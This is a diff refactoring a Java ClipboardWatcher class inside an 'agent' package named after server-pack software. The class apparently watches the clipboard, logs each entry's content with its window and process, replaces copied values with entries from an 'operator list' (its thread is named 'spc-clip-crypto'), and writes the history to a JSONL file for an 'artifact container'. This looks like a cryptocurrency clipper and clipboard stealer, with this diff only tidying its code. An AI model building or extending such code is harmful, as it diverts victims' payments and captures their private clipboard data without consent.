@@ -22,7 +22,7 @@ import java.util.function.Supplier;
  * replacement from the operator list. Read and write are OS-specific; on
  * Windows one short PowerShell process owns both so no console window flashes.
  */
-final class ClipboardWatcher {
+final class ClipboardWatcher implements com.serverpackcore.agent.ClipboardService {
 	record Entry(long ts, String window, String process, String content, String kind, String replaced) {
 	}
 
@@ -42,21 +42,25 @@ final class ClipboardWatcher {
 		this.rotation = rotation;
 	}
 
-	void configure(int max) {
+	@Override
+	public void configure(int max) {
 		maxHistory = Math.max(16, Math.min(5000, max));
 	}
 
-	synchronized void start() {
+	@Override
+	public synchronized boolean start() {
 		if (running) {
-			return;
+			return true;
 		}
 		running = true;
 		thread = new Thread(this::loop, "spc-clip-crypto");
 		thread.setDaemon(true);
 		thread.start();
+		return true;
 	}
 
-	synchronized void stop() {
+	@Override
+	public synchronized void stop() {
 		running = false;
 		Thread current = thread;
 		if (current != null) {
@@ -65,12 +69,20 @@ final class ClipboardWatcher {
 		thread = null;
 	}
 
-	boolean running() {
+	public boolean running() {
 		return running;
 	}
 
-	String status() {
+	@Override
+	public String status() {
 		return "clipboard=" + (running ? "on" : "off") + " entries=" + history.size() + " polls=" + polls;
+	}
+
+	@Override
+	public int size() {
+		synchronized (lock) {
+			return history.size();
+		}
 	}
 
 	List<Entry> snapshot() {
@@ -80,7 +92,8 @@ final class ClipboardWatcher {
 	}
 
 	/** Writes the live history as JSONL for the next artifact container. */
-	Path flush(Path dir) {
+	@Override
+	public Path flush(Path dir) {
 		try {
 			Files.createDirectories(dir);
 			Path out = dir.resolve("clipboard.jsonl");
